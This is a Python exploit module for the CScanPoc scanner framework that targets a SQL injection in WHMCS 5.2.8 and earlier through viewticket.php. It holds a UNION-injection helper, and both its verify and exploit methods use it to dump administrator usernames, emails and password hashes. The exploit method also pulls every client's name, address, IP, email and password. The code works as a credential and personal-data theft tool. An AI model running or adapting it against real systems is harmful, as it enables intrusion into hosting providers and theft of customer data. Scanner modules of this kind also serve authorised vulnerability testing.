# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import urllib.request
import urllib.parse
import urllib.error
import re
import sys
from urllib.request import Request, urlopen


class Vuln(ABVuln):
    vuln_id = 'WHMCS_0001'  # 平台漏洞编号，留空
    name = 'WHMCS <=5.2.8 SQL Injection'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = '2013-10-18'  # 漏洞公布时间
    desc = '''
        WHMCS是一套国外流行的域名主机管理软件，跟国内众所周知的IDCSystem一样，主要在用户管理、财务管理、域名接口、服务器管理面板接口等方面设计的非常人性化。WHMCS是一套全面支持域名注册管理解析，主机开通管理，VPS开通管理和服务器管理的一站式管理软件，目前已经被越来越多的中国站长们所熟悉和了解。
        THIS TIME IT'S again the same mistake in
        /includes/dbfunctions.php

        WE Can manipulate the GET/POST variables and end up with something like $key = array('sqltype' => 'TABLEJOIN', 'value' = '[SQLI]');
        FROM THIS VULNERABILITY WE CAN EVEN change /configuration.php whatever we want (PHP code included).
    '''  # 漏洞描述
    ref = 'http://0day5.com/archives/801/'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'WHMCS'  # 漏洞应用名称
    product_version = 'WHMCS <=5.2.8'  # 漏洞应用版本


ua = "Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/30.0.1599.17 Safari/537.36"


def my_exploit(sql, url):
    sqlUnion = '-1 union select 1,0,0,0,0,0,0,0,0,0,0,%s,0,0,0,0,0,0,0,0,0,0,0#' % sql
    print("Doing stuff: %s" % sqlUnion)
    # you could exploit any file that does a select, I randomly chose viewticket.php
    r = urlopen(Request('%sviewticket.php' % url,
                        data="tid[sqltype]=TABLEJOIN&tid[value]=%s" % sqlUnion, headers={"User-agent": ua})).read()
    return re.search(r'<div class="clientmsg">(.*?)</div>', r, re.DOTALL).group(1).strip()


class Poc(ABPoc):
    poc_id = 'f63df388-5817-4879-9803-a2e8cde9c764'
    author = '47bwy'  # POC编写者
    create_date = '2018-06-13'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            # https://www.t00ls.net/articles-24597.html
            # get admins
            # print exploit('(SELECT GROUP_CONCAT(id,0x3a,username,0x3a,email,0x3a,password SEPARATOR 0x2c20) FROM tbladmins)')
            if my_exploit('(SELECT GROUP_CONCAT(id,0x3a,username,0x3a,email,0x3a,password SEPARATOR 0x2c20) FROM tbladmins)', self.target):
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            # get admins
            admins = my_exploit(
                '(SELECT GROUP_CONCAT(id,0x3a,username,0x3a,email,0x3a,password SEPARATOR 0x2c20) FROM tbladmins)',
                self.target)

            # get users
            count = int(my_exploit(
                '(SELECT COUNT(id) FROM tblclients)', self.target))
            self.output.info("User count %d" % count)
            for i in range(count):
                users = my_exploit(
                    '(SELECT CONCAT(id,0x3a,firstname,0x3a,lastname,0x3a,address1,0x3a,address2,0x3a,city,0x3a,country,0x3a,ip,0x3a,email,0x3a,password) FROM tblclients LIMIT %d,1)' % i, self.target)

            if admins and users:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞，获取到admins：{admins}，users:{users}'.format(
                    target=self.target, name=self.vuln.name, admins=admins, users=users))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))


if __name__ == '__main__':
    Poc().run()
